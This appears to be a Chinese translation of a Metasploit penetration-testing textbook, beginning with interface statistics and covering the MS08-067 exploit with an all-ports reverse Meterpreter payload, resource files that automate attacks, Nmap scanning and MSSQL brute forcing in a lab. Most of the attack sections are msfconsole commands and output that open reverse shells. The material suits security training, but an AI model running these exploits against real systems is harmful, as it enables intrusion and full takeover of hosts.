### 网络接口信息

**子网掩码**: 255.255.255.0  
**状态**: UP, BROADCAST, RUNNING, MULTICAST  
**最大传输单元 (MTU)**: 1500  
**度量值 (Metric)**: 1  
**接收数据包 (RX packets)**: 3178  
- 错误 (errors): 0
- 丢弃 (dropped): 0
- 超载 (overruns): 0
- 帧错误 (frame): 0
**发送数据包 (TX packets)**: 2756  
- 错误 (errors): 0
- 丢弃 (dropped): 0
- 超载 (overruns): 0
- 载波错误 (carrier): 0
- 冲突 (collisions): 0
- 发送队列长度 (txqueuelen): 1000
**接收字节数 (RX bytes)**: 292351 (285.4 KiB)  
**发送字节数 (TX bytes)**: 214234 (209.2 KiB)  
**中断号 (Interrupt)**: 17  
**基地址 (Base address)**: 0x2000

---

**链路封装类型**: Local Loopback  
**IP 地址**: 127.0.0.1  
**子网掩码**: 255.0.0.0  
**状态**: UP, LOOPBACK, RUNNING  
**最大传输单元 (MTU)**: 16436  
**度量值 (Metric)**: 1  
**接收数据包 (RX packets)**: 0  
- 错误 (errors): 0
- 丢弃 (dropped): 0
- 超载 (overruns): 0
- 帧错误 (frame): 0
**发送数据包 (TX packets)**: 0  
- 错误 (errors): 0
- 丢弃 (dropped): 0
- 超载 (overruns): 0
- 载波错误 (carrier): 0
- 冲突 (collisions): 0
- 发送队列长度 (txqueuelen): 0
**接收字节数 (RX bytes)**: 0 (0.0 b)  
**发送字节数 (TX bytes)**: 0 (0.0 b)

---

### 第五章 渗透攻击之旅

#### 5.1 堆溢出攻击

堆溢出攻击利用动态内存分配中的漏洞来触发攻击代码。这种攻击并不是100%可靠的，如果第一次攻击没有成功，可以多次尝试 `exploit` 命令。

在本例中，我们使用了一个绑定 shell，在目标主机上打开了一个监听端口，Metasploit 创建了一个直接到目标系统的连接。如果攻击防火墙或 NAT 网关后的主机，应使用反弹式连接攻击载荷。

#### 5.2 全端口攻击载荷：暴力猜解目标开放的端口

在前面的例子中，我们之所以能够成功，主要是因为目标主机反弹连接使用的端口没有被过滤掉。但如果目标组织设置了严格的出站端口过滤怎么办？很多公司在防火墙上仅开放特定端口，其他端口一律关闭。

我们可以猜测 443 端口没有被禁止，同样可能还有 FTP、Telnet、SSH 和 HTTP 服务使用的端口。但 Metasploit 提供了一个专用的攻击载荷来帮助我们找到这些放行的端口。

这个攻击载荷会对所有可用的端口进行尝试，直到发现一个放行的端口。下面是一个示例：

```sh
msf> use windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > set LHOST 192.168.33.129
LHOST => 192.168.33.129
msf exploit(ms08_067_netapi) > set RHOST 192.168.33.130
RHOST => 192.168.33.130
msf exploit(ms08_067_netapi) > set TARGET 3
TARGET => 3
msf exploit(ms08_067_netapi) > searchports
[*] Searching loaded modules for pattern 'ports'...
Compatible Payloads
Name
Rank
Description
windows/dllinject/reverse_tcp_allports
normal
Reflective Dll Injection, Reverse All-Port TCP Stager
windows/meterpreter/reverse_tcp_allports
normal
Windows Meterpreter (Reflective Injection), Reverse All-Port TCP Stager
msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp_allports
PAYLOAD => windows/meterpreter/reverse_tcp_allports
msf exploit(ms08_067_netapi) > exploit -j
[*] Exploit running as background job.
```

结果如下：

```sh
[*] Started reverse handler on 192.168.33.129:10
[*] Triggering the vulnerability...
[*] Sending stage (748032 bytes)
[*] Meterpreter session 1 opened (192.168.33.129:1 -> 192.168.33.130:1047) @
msf exploit(ms08_067_netapi) > sessions -1 -v
Active sessions
Id  Type
Information
Connection
Via
1 meterpreter NTAUTHORITY\PI:EMAIL:1->192.168.33.130:1047
exploit/windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > sessions -i 1
[*] Starting interaction with 1...
meterpreter>
```

请注意，我们没有设置 LPORT 参数，而是使用 allports 攻击载荷在所有端口上进行监听，直到发现一个放行的端口。

#### 5.3 资源文件

资源文件是包含一系列自动化命令的脚本文件。可以在 MSF 终端中使用 `resource` 命令载入资源文件，或者在操作系统的命令行环境中使用 `-r` 标志将资源文件作为 MSF 终端的一个参数传递进来运行。

以下是一个简单的资源文件示例：

```sh
root@bt:/opt/framework3/msf3/ echo version >> resource.rc
root@bt:/opt/framework3/msf3/ echo load sounds >> resource.rc
root@bt:/opt/framework3/msf3/msfconsole -r resource.rc
```

执行结果如下：

```sh
resource(resource.rc)> version
Framework: 3.7.0-dev.12220
Console: 3.7.0-dev.12220
resource(resource.rc)> load sounds
[*] Successfully loaded plugin: sounds
msf >
```

在实验环境中，可以使用更复杂的资源文件自动发起攻击。以下是一个示例：

```sh
root@bt:/opt/framework3/msf3/ echo set RHOST 192.168.1.155 >> autoexploit.rc
root@bt:/opt/framework3/msf3/ echo set LHOST 192.168.1.101 >> autoexploit.rc
root@bt:/opt/framework3/msf3/ echo exploit >> autoexploit.rc
root@bt:/opt/framework3/msf3/msfconsole
msf> resource autoexploit.rc
resource(autoexploit.rc)> use exploit/windows/smb/ms08_067_netapi
resource (autoexploit.rc)> set RHOST 192.168.1.155
RHOST => 192.168.1.155
PAYLOAD => windows/meterpreter/reverse_tcp
resource (autoexploit.rc)> set LHOST 192.168.1.101
LHOST => 192.168.1.101
resource (autoexploit.rc)> exploit
[*] Started reverse handler on 192.168.1.101:4444
[*] Triggering the vulnerability...
[*] Sending stage (747008 bytes)
[*] Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.155:1033)
meterpreter>
```

#### 5.4 小结

恭喜你，你已经使用 MSF 终端发起了第一次针对实际主机的攻击，并获取了它的完全控制权！渗透攻击的本质是识别并充分利用目标系统中存在的安全弱点。本章中我们使用 nmap 识别出可能存在漏洞的服务，在此基础上发动攻击，并获取了系统的访问权限。

在第六章中，我们将对 Meterpreter 进行更为详细的探讨，并学习如何在攻击成功后玩转它。你会发现 Meterpreter 的强大功能会让你欣喜若狂。

---

### 第六章 Meterpreter

Meterpreter 是 Metasploit 框架中的一个扩展模块，可以调用 Metasploit 的一些功能，对目标系统进行更为深入的渗透。Meterpreter 是 Metasploit 框架中的“黑客瑞士军刀”，通常作为漏洞溢出后的攻击载荷所使用，攻击载荷在触发漏洞后能够返回给我们一个控制通道。

#### 6.1 攻陷 Windows XP 虚拟机

在详细介绍 Meterpreter 的功能特性之前，我们必须首先攻陷一台系统并取得一个 Meterpreter shell。

##### 6.1.1 使用 Nmap 扫描端口

我们开始使用 Nmap 对目标进行端口扫描，以识别开放的服务，寻找可以进行漏洞利用的端口，如下所示：

```sh
msf > nmap -sT -A -P0 192.168.33.130
[*] exec: nmap -sT -A -P0 192.168.33.130
..SNIP..
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
25/tcp open  smtp    Microsoft ESMTP 6.0.2600.2180
80/tcp open  http    Microsoft IIS webserver 5.1
135/tcp open  msrpc  Microsoft Windows RPC
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
1025/tcp open  msrpc  Microsoft Windows RPC
1433/tcp open  ms-sql-s Microsoft SQL Server 2005 9.00.1399; RTM
6646/tcp open  unknown
MAC Address: 00:0C:29:EA:26:7C (VMware)
Device type: general purpose
Running: Microsoft Windows XP|2003
OS details: Microsoft Windows XP Professional SP2 or Windows Server 2003
Nmap done: 1 IP address (1 host up) scanned in 37.58 seconds
msf>
```

通过端口扫描可以看到，系统开放了一些有意思的端口，包括 MSSQL 端口。更有意思的是通过 nmap 扫描，发现系统版本为 Windows XP Service Pack 2，这个版本的系统已经不再维护，许多已公开漏洞在 SP3 系统中已经修补，但在 SP2 中依然存在。

扫描结果中可以看到开放了 FTP 和 SMTP 端口，这两个端口可能存在可被利用的漏洞。同时也开放了 80 端口，意味着我们可以尝试进行 Web 应用攻击。

##### 6.1.2 攻击 MSSQL

在这个例子中，我们将对 MSSQL 的 1433 端口进行攻击，因为这个端口有许多已知的漏洞，可以实现完全入侵并获得管理员权限。

首先，我们需要确认安装了 MSSQL，然后尝试对 MSSQL 服务进行暴力破解以获取密码。MSSQL 默认安装在 TCP 1433 端口和 UDP 1434 端口，但新版本的 MSSQL 允许安装到随机动态分配的 TCP 端口，UDP 1434 端口则没有变化，可以通过 UDP 端口来查询获取 SQL 服务的 TCP 动态端口。

这里，通过扫描发现目标系统上的 UDP 1434 端口是开放的：

```sh
msf > nmap -sU 192.168.33.130 -p1434
Nmap scan report for 192.168.33.130
Host is up (0.00033s latency).
PORT   STATE SERVICE
1434/udp open  ms-sql-m
Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
msf>
```

可以看到，扫描主机发现 MSSQL 的 UDP 1434 端口是开放的。以 MS SQL 为目标，我们可以使用 `mssql_ping` 模块来找出 MS SQL 服务端口，并进行用户名与口令的猜测。MS SQL 在初次安装的时候需要用户创建 sa 或系统管理员用户。由于有些管理员在安装程序时没有足够的安全意识，常常会设置空密码或弱密码，因此我们可以尝试猜测或暴力破解 sa 用户的密码。

下一个例子中，我们将使用 `mssql_login` 模块来尝试对 sa 用户进行暴力破解。

```sh
msf > use scanner/mssql/mssql_ping
msf auxiliary(mssql_ping) > show options
Module options:
Name       Current Setting Required Description
PASSWORD   no              The password for the specified username
RHOSTS     yes             The target address range or CIDR identifier
THREADS    yes             The number of concurrent threads
```